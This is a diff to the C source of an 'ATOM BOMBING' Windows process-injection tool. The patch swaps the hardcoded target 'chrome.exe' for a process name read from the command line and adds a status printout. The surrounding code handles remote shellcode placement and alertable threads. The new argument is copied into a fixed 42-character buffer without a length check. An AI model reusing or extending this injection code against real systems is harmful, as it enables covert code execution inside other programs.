@@ -1691,7 +1691,7 @@ lblCleanup:
 
 
 
-int main()
+int main(int argc, char* args[])
 {
 	ESTATUS eReturn = ESTATUS_INVALID;
 	PVOID pvRemoteShellcodeAddress = NULL;
@@ -1708,7 +1708,11 @@ int main()
 	ATOM tAtom = 0;
 	printf("[*] ATOM BOMBING\n\n\n");
 
-	eReturn = main_OpenProcessByName(L"chrome.exe", &hProcess);
+	wchar_t wprocessName[42];
+	mbstowcs(wprocessName, args[1], strlen(args[1]) + 1);
+	LPWSTR processName = wprocessName;
+
+	eReturn = main_OpenProcessByName(processName, &hProcess);
 	if (ESTATUS_FAILED(eReturn))
 	{
 		goto lblCleanup;
@@ -1794,5 +1798,6 @@ lblCleanup:
 		CloseHandle(hAlertableThread);
 		hAlertableThread = NULL;
 	}
+	printf("\n\n[*] Last ESTATUS was %d", (int)eReturn);
 	return 0;
 }
